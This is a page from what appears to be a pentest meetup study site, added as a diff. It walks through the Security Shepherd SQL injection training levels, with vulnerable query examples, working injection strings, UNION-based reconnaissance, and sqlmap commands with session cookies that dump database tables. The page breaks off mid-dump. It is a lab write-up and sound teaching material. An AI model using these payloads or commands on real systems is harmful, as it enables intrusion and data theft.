@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.15.5. Injection &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3.15. Security Shepherd Web App Levels" href="security_shepherd.html"/>
+        <link rel="next" title="3.15.6. Insecure Cryptographic Storage" href="security_shepherd_crypto_storage.html"/>
+        <link rel="prev" title="3.15.4. Failure to Restrict URL Access" href="security_shepherd_url_access.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_intro.html">3.15.1. Security Shepherd Introduction</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_lessons.html">3.15.2. Lessons</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_csrf.html">3.15.3. CSRF</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_url_access.html">3.15.4. Failure to Restrict URL Access</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">3.15.5. Injection</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-techniques">3.15.5.1. SQL Injection Techniques</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-1">3.15.5.2. SQL Injection 1</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-2">3.15.5.3. SQL Injection 2</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-3">3.15.5.4. SQL Injection 3</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-4">3.15.5.5. SQL Injection 4</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-5">3.15.5.6. SQL Injection 5</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-6">3.15.5.7. SQL Injection 6</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-7">3.15.5.8. SQL Injection 7</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sql-injection-stored-procedure">3.15.5.9. SQL Injection Stored Procedure</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_crypto_storage.html">3.15.6. Insecure Cryptographic Storage</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_direct_ref.html">3.15.7. Insecure Direct Object References</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_session_management.html">3.15.8. Session Management</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_xss.html">3.15.9. XSS</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+          <li><a href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a> &raquo;</li>
+        
+      <li>3.15.5. Injection</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/security_shepherd_injection.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="injection">
+<span id="securityshepherdinjection"></span><h1>3.15.5. Injection<a class="headerlink" href="#injection" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="sql-injection-techniques">
+<h2>3.15.5.1. SQL Injection Techniques<a class="headerlink" href="#sql-injection-techniques" title="Permalink to this headline">¶</a></h2>
+<p>SQL injection occurs when data the user influences is used in a SQL query. Here’s a classic Java example:</p>
+<div class="highlight-java"><div class="highlight"><pre><span></span><span class="n">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span>
+  <span class="s">&quot;SELECT userName FROM users WHERE userName = &#39;&quot;</span> <span class="o">+</span>
+<span class="hll">  <span class="n">theUserName</span> <span class="o">+</span>
+</span>  <span class="s">&quot;&#39; AND userPassword = &#39;&quot;</span> <span class="o">+</span>
+<span class="hll">  <span class="n">thePassword</span> <span class="o">+</span>
+</span>  <span class="s">&quot;&#39;&quot;</span>
+<span class="o">);</span>
+</pre></div>
+</div>
+<p>Here both “theUserName” and “thePassword” are directly input from the user. Usually either a single or double quote is used around the user input: in this case it’s a single quote. Here, you have two choices for the first user input:</p>
+<ul>
+<li><p class="first">Enter a single quote, terminating the data value and allowing SQL query input. The SQL query can include a character that will treat the rest of the string after the injected SQL code as a comment. For example:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">theUsername = &quot;&#39; OR 1=1 #&quot;</span>
+<span class="go">thePassword = &quot;anything&quot;</span>
+
+<span class="go">SELECT userName FROM users WHERE userName = &#39;?&#39; AND userPassword = &#39;?&#39;</span>
+<span class="go">= SELECT userName FROM users WHERE userName = &#39;&#39; OR 1=1 # ... commented out</span>
+<span class="go">= SELECT userName FROM users WHERE true</span>
+</pre></div>
+</div>
+<p>Here, every userName is returned from the table.</p>
+</li>
+<li><p class="first">Enter a backslash (<code class="docutils literal"><span class="pre">\</span></code>), making the trailing single quote actually part of the data, along with the rest of the query until another single quote is encountered. Here, that would be up to where “thePassword” is injected, so “thePassword” could be SQL code without a leading single quote.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">theUsername = &quot;\&quot;</span>
+<span class="go">thePassword = &quot; UNION SELECT somecol FROM sometable WHERE condition #&quot;</span>
+
+<span class="go">SELECT userName FROM users WHERE userName = &#39;?&#39; AND userPassword = &#39;?&#39;</span>
+<span class="go">= SELECT userName FROM users WHERE userName = &#39;\&#39; AND userPassword = &#39; UNION SELECT somecol FROM sometable WHERE condition # ... commented out</span>
+<span class="go">= SELECT somecol FROM sometable WHERE condition</span>
+</pre></div>
+</div>
+<p>Essentially a completely different query is executed.</p>
+</li>
+</ul>
+<p>There can be injection even where prepared statements are used.</p>
+<div class="highlight-java"><div class="highlight"><pre><span></span><span class="n">PreparedStatement</span> <span class="n">callstmnt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span>
+    <span class="s">&quot;SELECT aColumn FROM aTable WHERE aColumn LIKE ?&quot;</span><span class="o">);</span>
+<span class="n">callstmnt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">userId</span><span class="o">);</span>
+</pre></div>
+</div>
+<p>In this case you can enter wildcard characters (in MySQL, <code class="docutils literal"><span class="pre">%</span></code> or <code class="docutils literal"><span class="pre">_</span></code>) to change the row or rows matched.</p>
+</div>
+<div class="section" id="sql-injection-1">
+<h2>3.15.5.2. SQL Injection 1<a class="headerlink" href="#sql-injection-1" title="Permalink to this headline">¶</a></h2>
+<p>The input to button <span class="guilabel">Get user</span> must look something like an email and return all rows in the table. The SQL query probably looks something like:</p>
+<div class="highlight-mysql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
+</pre></div>
+</div>
+<p>This is the shortest input we’ve found that works: <code class="docutils literal"><span class="pre">'+0#&#64;x</span></code></p>
+<p>The trailing <code class="docutils literal"><span class="pre">&#64;x</span></code> is needed to make it look like an email, the <code class="docutils literal"><span class="pre">#</span></code> to comment out the trailing <code class="docutils literal"><span class="pre">&#64;x</span></code>, the leading <code class="docutils literal"><span class="pre">'</span></code> to terminate the email string input, and the <code class="docutils literal"><span class="pre">+0</span></code> does the magic of making every row true. Adding or comparing a string to an integer causes the string to be coerced to a floating point value; that value will be 0 when the string does not represent an valid floating point value. So eventually we compare:</p>
+<div class="highlight-mysql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
+<span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">+</span><span class="mi">0</span><span class="c1">#@x&#39;</span>
+<span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">+</span><span class="mi">0</span>
+<span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="mi">0</span><span class="o">+</span><span class="mi">0</span>
+<span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="mi">0</span> <span class="o">=</span> <span class="mi">0</span>
+</pre></div>
+</div>
+<p>Another short string that works is <code class="docutils literal"><span class="pre">'||1#&#64;x</span></code>.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The Result key is</span>
+</span><span class="hll"><span class="go">f62abebf5658a6a44c5c9babc7865110c62f5ecd9d0a7052db48c4dbee0200e3</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="sql-injection-2">
+<h2>3.15.5.3. SQL Injection 2<a class="headerlink" href="#sql-injection-2" title="Permalink to this headline">¶</a></h2>
+<p>This is very similar to SQL Injection1 and a variant of the second answer above works: <code class="docutils literal"><span class="pre">'||1#</span></code></p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The reuslt Key is</span>
+</span><span class="hll"><span class="go">fd8e9a29dab791197115b58061b215594211e72c1680f1eacc50b0394133a09f</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="sql-injection-3">
+<h2>3.15.5.4. SQL Injection 3<a class="headerlink" href="#sql-injection-3" title="Permalink to this headline">¶</a></h2>
+<p>Since a variant of <code class="docutils literal"><span class="pre">'||1#</span></code> worked on the previous injections, trying it again lists all the user names. All we have to do is add a UNION query to return the credit card numbers:</p>
+<div class="highlight-mysql"><div class="highlight"><pre><span></span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">creditCardColumn</span> <span class="k">FROM</span> <span class="n">customerTable</span> <span class="k">WHERE</span> <span class="n">nameColumn</span> <span class="o">=</span> <span class="s1">&#39;Mary Martin&#39;</span>
+</pre></div>
+</div>
+<p>So we have to determine the customer table name and the column names for the credit card and name. Let’s use the SQL injection to recon the database:</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">VERSION()</span> <span class="pre">#</span></code> returns <strong>5.5.43-0ubuntu0.14.04.1</strong></li>
+<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">DATABASE()</span> <span class="pre">#</span></code> returns <strong>SqlChalThree</strong></li>
+<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">table_name</span> <span class="pre">from</span> <span class="pre">information_schema.tables</span> <span class="pre">where</span> <span class="pre">table_schema='SqlChalThree'</span> <span class="pre">#</span></code> returns <strong>SELECT command denied to user ‘HdmiNoSignal’&#64;’localhost’ for table ‘tables’</strong></li>
+</ul>
+<p>So we’re denied doing database recon and must resort to guessing. Fortunately we get a visible error. After a few tries we know <code class="docutils literal"><span class="pre">OR</span></code> is filtered out so we use <code class="docutils literal"><span class="pre">||</span></code> instead and make lots of tries to get the nameColumn. Eventually we see <code class="docutils literal"><span class="pre">'</span> <span class="pre">||</span> <span class="pre">customername</span> <span class="pre">=</span> <span class="pre">'Mary</span> <span class="pre">Martin'</span> <span class="pre">#</span></code> works. Next we need to guess the creditCardColumn. Eventually we see <code class="docutils literal"><span class="pre">'</span> <span class="pre">||</span> <span class="pre">creditcardnumber</span> <span class="pre">=</span> <span class="pre">'0'</span> <span class="pre">#</span></code> works. Finally we need the table. Eventually we see <code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">creditcardnumber</span> <span class="pre">FROM</span> <span class="pre">customers</span> <span class="pre">WHERE</span> <span class="pre">customername</span> <span class="pre">=</span> <span class="pre">'Mary</span> <span class="pre">Martin'</span> <span class="pre">#</span></code> works and we get the credit card number:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">9815 1547 3214 7569</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="sql-injection-4">
+<h2>3.15.5.5. SQL Injection 4<a class="headerlink" href="#sql-injection-4" title="Permalink to this headline">¶</a></h2>
+<p>Generally you disrupt the SQL query by placing single (<code class="docutils literal"><span class="pre">'</span></code>) or double (<code class="docutils literal"><span class="pre">&quot;</span></code>) quotes in the inputs, or if those are filtered placing a backslash as input to consume the trailing single or double quote. After playing around with single and double quotes we suspect they are being filtered. So we try these values:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">UserName = \</span>
+<span class="go">Password = ||1#</span>
+</pre></div>
+</div>
+<p>That works to get us signed in as “adam”, who is not an admin. Now we have to make sure the person selected is an admin. To avoid having to know the table, column, and user names we’ll just select users one-by-one by starting with <span class="guilabel">Password</span> set to <code class="docutils literal"><span class="pre">||1</span> <span class="pre">LIMIT</span> <span class="pre">1</span> <span class="pre">OFFSET</span> <span class="pre">1#</span></code>, increasing the offset by 1 until we get success. The “admin” account was at offset 1:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Signed in as admin</span>
+</span>
+<span class="hll"><span class="go">As you are the admin, here is the result key:</span>
+</span><span class="hll"><span class="go">d316e80045d50bdf8ed49d48f130b4acf4a878c82faef34daff8eb1b98763b6f</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="sql-injection-5">
+<h2>3.15.5.6. SQL Injection 5<a class="headerlink" href="#sql-injection-5" title="Permalink to this headline">¶</a></h2>
+<p>Viewing the page source using Firebug reveals JavaScript with VipCouponCheck POST URL</p>
+<div class="highlight-html"><div class="highlight"><pre><span></span>/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck
+</pre></div>
+</div>
+<p>with parameter “couponCode”. Here’s the relevant JavaScript:</p>
+<div class="highlight-javascript"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">_0xffee</span> <span class="o">=</span> <span class="p">[</span> <span class="s2">&quot;change&quot;</span><span class="p">,</span> <span class="s2">&quot;val&quot;</span><span class="p">,</span> <span class="s2">&quot;#couponCode&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck&quot;</span><span class="p">,</span> <span class="s2">&quot;ajax&quot;</span><span class="p">,</span> <span class="s2">&quot;8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck&quot;</span><span class="p">,</span> <span class="s2">&quot;#vipCouponCode&quot;</span> <span class="p">];</span>
+
+<span class="nx">$</span><span class="p">(</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">0</span><span class="p">]](</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">1</span><span class="p">]]();</span>
+    <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">$</span><span class="p">[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">5</span><span class="p">]]({</span>
+        <span class="nx">type</span><span class="o">:</span> <span class="nx">_0xffee</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
+        <span class="nx">url</span><span class="o">:</span> <span class="nx">_0xffee</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span>
+        <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
+            <span class="nx">couponCode</span><span class="o">:</span> <span class="nx">a</span>
+        <span class="p">},</span>
+        <span class="nx">async</span><span class="o">:</span> <span class="kc">false</span>
+    <span class="p">});</span>
+<span class="p">})[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">0</span><span class="p">]]();</span>
+
+<span class="nx">$</span><span class="p">(</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">7</span><span class="p">])[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">0</span><span class="p">]](</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">1</span><span class="p">]]();</span>
+    <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">$</span><span class="p">[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">5</span><span class="p">]]({</span>
+        <span class="nx">type</span><span class="o">:</span> <span class="nx">_0xffee</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
+        <span class="nx">url</span><span class="o">:</span> <span class="nx">_0xffee</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span>
+        <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
+            <span class="nx">couponCode</span><span class="o">:</span> <span class="nx">a</span>
+        <span class="p">},</span>
+        <span class="nx">async</span><span class="o">:</span> <span class="kc">false</span>
+    <span class="p">});</span>
+<span class="p">})[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">0</span><span class="p">]]();</span>
+</pre></div>
+</div>
+<p>Let’s look for SQL injection there:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, Firebug gives the URL and POSTDATA.</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck&#39;</span>
+<span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;couponCode=*&#39;</span>
+
+rm -rf sqlmap
+sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+    --banner --current-user --current-db --is-dba <span class="se">\</span>
+    --users --passwords --dbs --exclude-sysdbs <span class="se">\</span>
+    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-text"><div class="highlight"><pre><span></span>[09:24:48] [INFO] (custom) POST parameter &#39;#1*&#39; is &#39;Generic UNION query (NULL) - 1 to 20 columns&#39; injectable
+(custom) POST parameter &#39;#1*&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
+    Payload: couponCode=&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))fumP) AND &#39;bBLE&#39;=&#39;bBLE
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: couponCode=&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71717a7171,0x446c7a46745958525447,0x71766a7871)--
+---
+back-end DBMS: MySQL 5.0.12
+banner:    &#39;5.5.43-0ubuntu0.14.04.1&#39;
+current user:    &#39;DnTVipUser&amp;#x40;localhost&#39;
+current database:    &#39;SQLiC5Shop&#39;
+database management system users [1]:
+[*] &amp;#x27;DnTVipUser&amp;#x27;&amp;#x40;&amp;#x27;localhost&amp;#x27;
+[09:24:59] [ERROR] unable to retrieve the password hashes for the database users (probably because the session user has no read privileges over the relevant system database table)
+available databases [2]:
+[*] information_schema
+<span class="hll">[*] SQLiC5Shop
+</span></pre></div>
+</div>
+<p>Let’s find the tables in database SQLiC5Shop:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+<span class="hll">    -D <span class="s1">&#39;SQLiC5Shop&#39;</span> --tables <span class="se">\</span>
+</span>    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SQLiC5Shop</span>
+<span class="go">[2 tables]</span>
+<span class="go">+------------+</span>
+<span class="go">| items      |</span>
+<span class="hll"><span class="go">| vipCoupons |</span>
+</span><span class="go">+------------+</span>
+</pre></div>
+</div>
+<p>Let’s dump the table vipCoupons:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+<span class="hll">    -D <span class="s1">&#39;SQLiC5Shop&#39;</span> -T <span class="s1">&#39;vipCoupons&#39;</span> --dump <span class="se">\</span>
+</span>    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SQLiC5Shop</span>
+<span class="go">Table: vipCoupons</span>
+<span class="go">[1 entry]</span>
+<span class="go">+--------+-------------+------------+---------------------------------------------+</span>
+<span class="go">| itemId | vipCouponId | perCentOff | couponCode                                  |</span>
+<span class="go">+--------+-------------+------------+---------------------------------------------+</span>
